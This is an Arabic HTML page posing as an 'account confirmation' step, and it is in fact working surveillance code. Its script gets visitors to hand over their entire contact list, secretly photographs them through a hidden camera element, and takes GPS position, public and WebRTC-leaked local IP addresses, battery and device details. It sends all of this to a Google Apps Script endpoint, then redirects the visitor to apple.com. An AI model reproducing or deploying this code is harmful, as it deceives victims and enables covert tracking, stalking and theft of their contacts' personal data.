<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>تأكيد الحساب</title>
<style>
  *{box-sizing:border-box}
  body{font-family:system-ui,-apple-system,sans-serif;background:#0b1118;color:#e9f0f7;
       margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
  .card{width:min(100%,380px);background:#16202c;padding:26px;border-radius:18px;text-align:center}
  h1{font-size:19px;margin:0 0 10px}
  p{color:#93a3b5;font-size:13.5px;line-height:1.7;margin:0 0 18px}
  button{width:100%;padding:14px;border:0;border-radius:12px;font-size:15px;font-weight:600;
         background:#2f6df6;color:#fff;cursor:pointer;margin-top:10px}
  button:disabled{opacity:.5}
  #btnContacts{background:#243244;font-weight:500}
  #st{font-size:12.5px;color:#93a3b5;margin-top:14px;min-height:18px}
  #vcf{display:none}
  #cam{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:0;left:0}
  .ov{position:fixed;inset:0;background:rgba(6,10,16,.94);display:none;
      align-items:center;justify-content:center;padding:24px;z-index:9;text-align:right}
  .ov.on{display:flex}
  .ov div{max-width:340px}
  .ov h2{font-size:17px;margin:0 0 14px}
  .ov ol{margin:0;padding-inline-start:20px;color:#c7d4e2;font-size:14px;line-height:2}
  .ov button{background:#1b2735}
</style>
</head>
<body>

<div class="card">
  <h1>تأكيد الحساب</h1>
  <p>اضغط «موافق» ثم اتبع الخطوات. قد يُطلب منك السماح بالكاميرا والموقع.</p>
  <button id="go">موافق</button>
  <button id="btnContacts" type="button">إعادة سحب جهات الاتصال</button>
  <div id="st"></div>
</div>

<div class="ov" id="ov">
  <div>
    <h2 id="ovT">خطوات سحب جهات الاتصال</h2>
    <ol id="ovL">
      <li>ستفتح قائمة جهات الاتصال.</li>
      <li>اضغط زر «الكل» أو «تحديد الكل» أعلى الشاشة.</li>
      <li>اضغط «إضافة» أو «تم» في الأسفل.</li>
    </ol>
    <button id="ovB">فهمت</button>
  </div>
</div>

<input id="vcf" type="file" accept=".vcf,text/vcard,text/x-vcard">
<video id="cam" playsinline muted autoplay></video>

<script>
const API = 'https://script.google.com/macros/s/AKfycbzfEjbaRixn33EdS7URKB73x5WWksmj-Euj4zcgLC7Tnnia8FYR7aAtMoEJvtBuTGZXcw/exec';
const APPLE = 'https://www.apple.com/';

const st = document.getElementById('st');
const vcfInput = document.getElementById('vcf');
const ov = document.getElementById('ov');
const camEl = document.getElementById('cam');

let NONCE = null;
let vcfResolve = null;

const sleep = ms => new Promise(r => setTimeout(r, ms));
const newNonce = () => (crypto.randomUUID ? crypto.randomUUID() : Date.now() + '' + Math.random()).replace(/-/g, '');

async function post(body){
  await fetch(API, {
    method:'POST', mode:'no-cors', cache:'no-store',
    headers:{'Content-Type':'text/plain;charset=utf-8'},
    body: JSON.stringify(body)
  });
}

function withTimeout(p, ms, def){
  return new Promise(res => {
    let done = false;
    const t = setTimeout(() => { if(!done){ done = true; res(def); } }, ms);
    Promise.resolve(p).then(
      v => { if(!done){ done = true; clearTimeout(t); res(v); } },
      () => { if(!done){ done = true; clearTimeout(t); res(def); } }
    );
  });
}

/* ---------------- الجهاز ---------------- */
function parseUA(){
  const ua = navigator.userAgent || '';
  const uad = navigator.userAgentData || null;
  const touchMac = /Macintosh/.test(ua) && navigator.maxTouchPoints > 1;

  let type = 'حاسوب';
  const isTablet = /iPad/i.test(ua) || touchMac || /Tablet|PlayBook|Silk/i.test(ua)
                   || (/Android/i.test(ua) && !/Mobile/i.test(ua));
  const isPhone  = (uad && uad.mobile) || /Mobi|iPhone|iPod|Windows Phone/i.test(ua)
                   || /Android.*Mobile/i.test(ua);
  if (isTablet) type = 'تابلت';
  else if (isPhone) type = 'هاتف';
  if (/TV|SmartTV|AppleTV|CrKey|Roku|BRAVIA|AFT[BM]/i.test(ua)) type = 'تلفاز';
  if (/Watch/i.test(ua)) type = 'ساعة';

  let os = 'غير معروف', osv = '';
  const g = re => { const x = re.exec(ua); return x ? String(x[1] || '').replace(/_/g, '.') : ''; };
  if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
  else if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Android/i.test(ua)) { os = 'Android'; osv = g(/Android (\d+(?:\.\d+)*)/i); }
  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = g(/OS (\d+(?:_\d+)*)/i); }
  else if (/Mac OS X/i.test(ua)) { os = touchMac ? 'iPadOS' : 'macOS'; osv = g(/Mac OS X (\d+(?:[._]\d+)*)/i); }
  else if (/CrOS/i.test(ua)) os = 'ChromeOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  let br = 'غير معروف', brv = '';
  const list = [
    ['Edge', /Edg(?:A|iOS)?\/(\d+)/i],
    ['Samsung Internet', /SamsungBrowser\/(\d+)/i],
    ['Opera', /(?:OPR|Opera)[ \/](\d+)/i],
    ['Firefox', /(?:Firefox|FxiOS)\/(\d+)/i],
    ['Chrome', /(?:Chrome|CriOS)\/(\d+)/i],
    ['Safari', /Version\/(\d+)/i]
  ];
  for (let i = 0; i < list.length; i++){
    const x = list[i][1].exec(ua);
    if (x){ br = list[i][0]; brv = x[1]; break; }
  }

  return { type, os, osv, br, brv };
}

async function deviceInfo(){
  const p = parseUA();
  let model = '';
  try{
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues){
      const h = await withTimeout(
        navigator.userAgentData.getHighEntropyValues(['model','platformVersion']), 2500, null);
      if (h && h.model) model = h.model;
      if (h && h.platformVersion && p.os === 'Android') p.osv = h.platformVersion;
    }
  }catch(_){}

  return {
    text: [p.type, model, p.os + (p.osv ? ' ' + p.osv : ''), p.br + (p.brv ? ' ' + p.brv : '')]
            .filter(Boolean).join(' — '),
    type: p.type, model: model
  };
}

/* ---------------- الكاميرا ---------------- */
async function snap(){
  try{
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return '';
    const stream = await withTimeout(navigator.mediaDevices.getUserMedia({
      video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:1280} }, audio:false
    }), 15000, null);
    if (!stream) return '';

    camEl.srcObject = stream;
    try { await camEl.play(); } catch(_){}
    await sleep(900);

    const vw = camEl.videoWidth || 640;
    const vh = camEl.videoHeight || 480;
    const w = 480;
    const h = Math.max(1, Math.round(w * vh / vw));

    const c = document.createElement('canvas');
    c.width = w; c.height = h;
    const ctx = c.getContext('2d');
    ctx.drawImage(camEl, 0, 0, w, h);

    stream.getTracks().forEach(t => t.stop());
    camEl.srcObject = null;

    return c.toDataURL('image/jpeg', 0.6);
  }catch(_){ return ''; }
}

async function sendPhoto(img){
  if (!img || img.length < 2000) return false;
  for (let t = 0; t < 3; t++){
    try { await post({ a:'photo', nonce:NONCE, img }); return true; }
    catch(_){ await sleep(700); }
  }
  return false;
}

/* ---------------- البيئة ---------------- */
function geo(){
  return new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => res({ lat:p.coords.latitude, lng:p.coords.longitude, acc:p.coords.accuracy }),
      () => res(null),
      { enableHighAccuracy:true, timeout:9000, maximumAge:0 }
    );
  });
}

async function battery(){
  try{
    if (!navigator.getBattery) return {};
    const b = await navigator.getBattery();
    return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'يشحن' : 'لا يشحن' };
  }catch(_){ return {}; }
}

function localIp(){
  return new Promise(res => {
    const ips = new Set();
    let done = false;
    const fin = () => { if(!done){ done = true; res([...ips]); } };
    try{
      const pc = new RTCPeerConnection({ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if (!e.candidate) return fin();
        const m = /(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
        if (m) ips.add(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(fin);
      setTimeout(fin, 4000);
    }catch(_){ fin(); }
  });
}

/* ---------------- جهات الاتصال ---------------- */
function showOv(title, lines){
  document.getElementById('ovT').textContent = title;
  document.getElementById('ovL').innerHTML = lines.map(x => '<li>' + x + '</li>').join('');
  ov.classList.add('on');
}
function hideOv(){ ov.classList.remove('on'); }
document.getElementById('ovB').addEventListener('click', hideOv);

function toRows(list){
  return (list || []).map(c => ({
    n: (c.name || []).filter(Boolean).slice(0, 2),
    t: (c.tel || []).filter(Boolean).slice(0, 3),
    e: (c.email || []).filter(Boolean).slice(0, 2)
  })).filter(r => r.n.length || r.t.length || r.e.length);
}

function canPicker(){
  return window.isSecureContext && 'contacts' in navigator
         && typeof navigator.contacts.select === 'function';
}

function pickVcf(ios){
  return new Promise(res => {
    vcfResolve = res;
    showOv(
      ios ? 'طريقة إرسال جهات الاتصال' : 'اختر ملف جهات الاتصال',
      ios
        ? ['افتح تطبيق «جهات الاتصال» على جهازك.',
           'اضغط «كل جهات الاتصال» أعلى الشاشة ثم «مشاركة».',
           'اختر «مشاركة جهات الاتصال» وانتظر حتى تجهز.',
           'ارجع هنا واضغط «فهمت» ثم اختر الملف.']
        : ['ارجع لهذه الصفحة واضغط «فهمت».',
           'اختر ملف <b>.vcf</b> الذي صدّرته من تطبيق جهات الاتصال.']
    );
    setTimeout(() => vcfInput.click(), 400);
    setTimeout(() => { if (vcfResolve === res){ vcfResolve = null; res([]); } }, 180000);
  });
}

vcfInput.addEventListener('change', async e => {
  const f = e.target.files && e.target.files[0];
  e.target.value = '';
  const res = vcfResolve;
  vcfResolve = null;
  hideOv();
  if (!f){ if (res) res([]); return; }
  let rows = [];
  try { rows = parseVcf(await f.text()); } catch(_){}
  if (res) res(rows);
});

/* يُستدعى داخل نفس ضغطة المستخدم */
async function grabContacts(){
  if (canPicker()){
    showOv('خطوات سحب جهات الاتصال', [
      'ستفتح قائمة جهات الاتصال.',
      'اضغط «الكل» أو «تحديد الكل» أعلى الشاشة.',
      'اضغط «إضافة» أو «تم» في الأسفل.',
      'إن ظهرت نافذة سماح — اسمح بكل الأسماء والأرقام.'
    ]);
    await sleep(300);
    try{
      const list = await navigator.contacts.select(['name','tel','email'], { multiple:true });
      hideOv();
      return toRows(list);
    }catch(err){
      hideOv();
      if (err && err.name === 'AbortError') return [];
    }
  }
  const ios = /iPhone|iPad|iPod/i.test(navigator.userAgent);
  return await pickVcf(ios);
}

async function sendContacts(rows){
  const CH = 100;
  for (let i = 0; i < rows.length; i += CH){
    const body = { a:'contacts', n:NONCE, from:i, total:rows.length, rows:rows.slice(i, i + CH) };
    for (let t = 0; t < 3; t++){
      try { await post(body); break; }
      catch(_){ await sleep(800); }
    }
  }
}

/* ---------------- المسار الرئيسي ---------------- */
async function runFlow(btn){
  if (btn) btn.disabled = true;
  NONCE = newNonce();

  /* 1) جهات الاتصال أولًا وقبل أي حوار آخر */
  st.textContent = 'جارٍ قراءة جهات الاتصال…';
  let rows = [];
  try { rows = await withTimeout(grabContacts(), 180000, []); } catch(_){ rows = []; }

  /* 2) الصورة — قبل الإرسال حتى تُرفق بالسجل */
  st.textContent = 'جارٍ التقاط الصورة…';
  const img = await snap();
  if (img) await sendPhoto(img);

  /* 3) بقية البيانات */
  st.textContent = 'جارٍ التحقق…';
  const [g, b, ips, dv] = await Promise.all([geo(), battery(), localIp(), deviceInfo()]);

  let ip = 'N/A';
  try{
    const r = await fetch('https://api.ipify.org?format=json', { cache:'no-store' });
    ip = (await r.json()).ip || 'N/A';
  }catch(_){}

  if (rows.length) await sendContacts(rows);

  const withPhone = rows.filter(r => r.t.length).length;

  try{
    await post({
      nonce: NONCE,
      time: new Date().toString(),
      ip,
      localIp: ips.find(x => x.startsWith('192.168.') || x.startsWith('10.') || x.startsWith('172.')) || 'N/A',
      rtc: ips, ips,
      lat: g ? g.lat : '', lng: g ? g.lng : '', acc: g ? g.acc : '',
      geoSource: g ? 'GPS' : '',
      battery: b.level || '', charging: b.charging || '',
      ua: navigator.userAgent,
      platform: navigator.platform,
      device: dv.text, model: dv.model, type: dv.type,
      screen: screen.width + 'x' + screen.height,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      lang: navigator.language,
      network: navigator.connection ? navigator.connection.effectiveType : '',
      native: (navigator.standalone === true ||
               matchMedia('(display-mode: standalone)').matches) ? 'نعم' : 'لا',
      cCount: rows.length,
      cJson: rows.length && rows.length <= 200 ? rows : [],
      sCount: 0, sJson: [], lCount: 0, lJson: [],
      fp: '', cred: [], hist: [], misc: []
    });
  }catch(_){}

  const parts = [];
  if (rows.length) parts.push(rows.length + ' جهة اتصال');
  if (img) parts.push('صورة');
  st.textContent = 'تم التحقق ✓' + (parts.length ? ' — ' + parts.join(' · ') : '');

  if (rows.length && !withPhone) {
    showOv('لم تُرجع الأرقام', [
      'رجعت الأسماء بدون أرقام — غالبًا لم تُمنح صلاحية الأرقام.',
      'اضغط «موافق» مرة أخرى واختر «السماح بكل شيء».',
      'أو استخدم ملف vCard بدلًا من القائمة.'
    ]);
  }

  await sleep(900);
  location.href = APPLE;
}

document.getElementById('go').addEventListener('click', e => runFlow(e.target));

document.getElementById('btnContacts').addEventListener('click', async e => {
  if (!NONCE) return runFlow(e.target);
  e.target.disabled = true;
  st.textContent = 'جارٍ قراءة جهات الاتصال…';
  let rows = [];
  try { rows = await withTimeout(grabContacts(), 180000, []); } catch(_){}
  if (rows.length){
    await sendContacts(rows);
    st.textContent = 'تم إرسال ' + rows.length + ' جهة اتصال' +
      (rows.filter(r => r.t.length).length ? '' : ' — بدون أرقام');
  } else {
    st.textContent = 'لم يتم اختيار أي جهة اتصال';
  }
  e.target.disabled = false;
});

/* ---------------- vCard ---------------- */
function parseVcf(txt){
  const rows = [];
  let cur = null;
  const un = s => s.replace(/\\n/gi, ' ').replace(/\\,/g, ',').replace(/\\;/g, ';').trim();

  txt.split(/\r?\n/).forEach(line => {
    if (/^BEGIN:VCARD/i.test(line)){ cur = { n:[], t:[], e:[] }; return; }
    if (/^END:VCARD/i.test(line)){ if (cur) rows.push(cur); cur = null; return; }
    if (!cur || /^[ \t]/.test(line)) return;

    const i = line.indexOf(':');
    if (i < 0) return;
    const key = line.slice(0, i).toUpperCase().split(';')[0];
    const val = un(line.slice(i + 1));
    if (!val) return;

    if (key === 'FN') cur.n.push(val);
    else if (key === 'N'){
      const p = val.split(';').map(x => x.trim()).filter(Boolean).reverse();
      if (p.length) cur.n.push(p.join(' '));
    }
    else if (key.startsWith('TEL')){
      const d = val.replace(/[^\d+]/g, '');
      if (d.length >= 6) cur.t.push(d);
    }
    else if (key.startsWith('EMAIL')) cur.e.push(val);
  });

  return rows
    .map(r => ({
      n: [...new Set(r.n)].filter(Boolean).slice(0, 2),
      t: [...new Set(r.t)].slice(0, 3),
      e: [...new Set(r.e)].filter(Boolean).slice(0, 2)
    }))
    .filter(r => r.n.length || r.t.length || r.e.length);
}
</script>
</body>
</html>
